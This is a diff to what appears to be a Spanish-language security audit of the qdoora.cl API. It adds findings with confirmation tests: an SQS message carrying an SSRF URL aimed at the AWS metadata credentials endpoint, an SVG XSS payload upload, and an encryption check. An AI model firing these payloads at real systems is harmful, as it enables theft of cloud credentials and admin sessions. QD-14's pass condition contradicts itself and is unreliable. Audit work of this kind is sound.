@@ -196,3 +196,54 @@ curl -X POST https://api.qdoora.cl/api/v1/generarPdf \
   -d '{"htmlCode":"<h1>Injected</h1>"}'
 # Si el PDF resultante renderiza el H1 → QD-11 CONFIRMADO
 ```
+
+---
+
+## QD-12 — SQS Message Poisoning / SSRF (Deserialización Insegura)
+**Riesgo**: Un atacante que logra inyectar mensajes en una cola SQS (por falta de políticas restrictivas IAM) envía un payload manipulado. Si el worker de Laravel que procesa el Job realiza una deserialización insegura (`unserialize()`) o extrae URLs del payload para hacer peticiones (`Http::get()`) sin validación, puede causar Ejecución Remota de Código (RCE) o SSRF (Server-Side Request Forgery) para exfiltrar metadatos de AWS (ej. `169.254.169.254`).
+
+**Test de confirmación:**
+```bash
+# Inyectar payload con URL maliciosa o de SSRF directamente en la cola SQS
+aws sqs send-message \
+  --queue-url https://sqs.us-east-1.amazonaws.com/ACCOUNT/qdoora-prod-queue \
+  --message-body '{"job":"App\\Jobs\\ProcessData","data":{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}}'
+
+# Monitorear logs del worker o servidor DNS del atacante
+# Si el worker intenta hacer la petición HTTP o lanza excepción de deserialización → QD-12 CONFIRMADO
+```
+
+---
+
+## QD-13 — Stored XSS vía Uploads a S3 (Falta de Content-Disposition)
+**Riesgo**: La aplicación permite la subida de archivos aparentemente inofensivos (ej. imágenes `.svg` o `.html`). Si estos archivos se sirven directamente desde el bucket S3 sin el header `Content-Disposition: attachment` o con el `Content-Type: text/html`, un administrador que haga clic en el enlace pre-firmado ejecutará el código JavaScript inyectado en su navegador, bajo su sesión autenticada.
+
+**Test de confirmación:**
+```bash
+# Subir archivo SVG con payload XSS
+cat <<EOF > payload.svg
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>
+EOF
+
+curl -X POST https://api.qdoora.cl/api/v1/upload \
+  -H "Authorization: Bearer $TOKEN" \
+  -F "file=@payload.svg"
+
+# Obtener URL pre-firmada y acceder desde el navegador
+# Si el navegador renderiza el SVG y ejecuta el alert() en lugar de forzar la descarga → QD-13 CONFIRMADO
+```
+
+---
+
+## QD-14 — Falta de SSE-KMS en Reposo para Colas SQS
+**Riesgo**: Las colas SQS almacenan información sensible (ej. detalles de nóminas, reportes, datos de empleados) en texto claro dentro de la infraestructura de AWS. Un actor con permisos de lectura en la consola de AWS o un IAM role comprometido puede leer estos mensajes.
+
+**Test de confirmación:**
+```bash
+# Verificar atributos de encriptación de la cola SQS
+aws sqs get-queue-attributes \
+  --queue-url https://sqs.us-east-1.amazonaws.com/ACCOUNT_ID/qdoora-prod-queue \
+  --attribute-names KmsMasterKeyId SqsManagedSseEnabled
+
+# Si responde sin KmsMasterKeyId o SqsManagedSseEnabled: true → QD-14 CONFIRMADO
+```
